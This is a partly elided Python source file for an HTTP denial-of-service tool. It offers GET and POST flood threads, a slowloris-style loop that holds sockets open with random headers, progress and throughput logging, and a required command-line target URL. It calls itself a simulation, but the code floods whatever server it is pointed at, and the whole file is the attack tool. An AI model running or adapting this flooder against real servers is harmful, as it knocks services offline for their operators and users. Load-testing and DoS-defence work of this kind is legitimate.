...
class HTTPDoSAttack:
    ...
    def __init__(
        ...
        if attack_method not in self.ATTACK_METHODS:
            raise ValueError(
                f"Unsupported attack method: {attack_method}. Supported methods: {', '.join(self.ATTACK_METHODS)}"
            )
        ...
        self.num_connections = max(
            1, min(num_connections, 1000)
        )  # Limit connections to reasonable range
        ...
        logger.info("Initialized HTTP DoS attack simulation")
        logger.info(f"Target: {target_url}")
        logger.info(f"Attack method: {attack_method}")
        if self.verbose:
            logger.info(
                f"Connections: {num_connections}, Duration: {duration}s, Timeout: {timeout}s"
            )
    ...
    def _get_flood(self, thread_id: int) -> None:
        ...
        while not self.stop_event.is_set():
            try:
                ...
                if self.verbose:
                    logger.debug(
                        f"Thread {thread_id}: GET request successful, status {response.status_code}"
                    )
    ...
    def _post_flood(self, thread_id: int) -> None:
        ...
        while not self.stop_event.is_set():
            try:
                ...
                if self.verbose:
                    logger.debug(
                        f"Thread {thread_id}: POST request successful, status {response.status_code}"
                    )
        ...
        while not self.stop_event.is_set() and sockets:
            for i, s in enumerate(list(sockets)):
                try:
                    ...
                    s.send(
                        f"X-Header-{random.randint(1, 1000)}: {random.randint(1, 1000)}\r\n".encode()
                    )
        ...
        try:
            ...
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                ...
                if int(elapsed) % 5 == 0:
                    with self.lock:
                        logger.info(
                            f"Progress: {progress:.1f}%, Active connections: {self.active_connections}, "
    ...
    def _print_summary(self, stats: dict[str, Any]) -> None:
        ...
        logger.info(
            f"Data sent: {stats['bytes_sent'] / 1024:.2f} KB ({stats['bytes_sent_per_second'] / 1024:.2f} KB/s)"
        )
        logger.info(
            f"Data received: {stats['bytes_received'] / 1024:.2f} KB ({stats['bytes_received_per_second'] / 1024:.2f} KB/s)"
        )
        logger.info("=" * 50)
...
def parse_arguments() -> argparse.Namespace:
    ...
    # Required arguments
    parser.add_argument(
        "-t", "--target", dest="target_url", required=True, help="URL of the target web server"
    )
